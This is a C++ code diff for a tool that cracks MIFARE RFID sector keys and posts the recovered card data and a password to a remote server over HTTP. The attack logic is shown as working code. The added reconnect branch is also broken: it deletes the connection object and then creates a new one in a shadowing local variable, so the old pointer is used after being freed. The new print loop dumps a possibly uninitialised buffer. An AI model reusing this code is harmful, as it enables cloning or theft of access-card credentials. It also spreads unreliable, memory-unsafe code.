@@ -116,7 +116,13 @@ int main()
 	if( rfid.crackKey( AUTHENT_A, exploitSector*4, lockedSectors[sector]*4 ) )
 	{
 	    nrOfRecoveredKeys++;
-	    RFID.initCom();
+	    if( !post->isConnected() )
+	    {
+		delete post;
+		auto post = new HttpPostMaker( &serverName, 80, STREAM, domain );
+	    }
+	    
+	    rfid.initCom();
 	    sendSector( &rfid, lockedSectors[sector], post, false );// class has now updated the key
 	}
     }
@@ -145,6 +151,7 @@ void sendSector( MFrec *rfid, int sector, HttpPostMaker *post, bool locked )
 {
     unsigned char block[18];
     std::stringstream ss;
+    char buffer[4096];
 
     for( int blk = 0; blk<4; blk++ )
     {
@@ -200,11 +207,12 @@ void sendSector( MFrec *rfid, int sector, HttpPostMaker *post, bool locked )
 	}
 
 	post->addToBody( var4 + "=" + password );
-	//std::cout << post->getPOST() <<"\n\n";
-	std::cout << "Sending? ";
    
-	post->send();
-	post->recvMsg();
+	post->sendPOST();
+	post->receive( buffer, 4096 );
+	for( auto c : buffer )
+	    std::cout << c;
+	std::cout << std::endl;
 	usleep(10);
     }// for each block
 
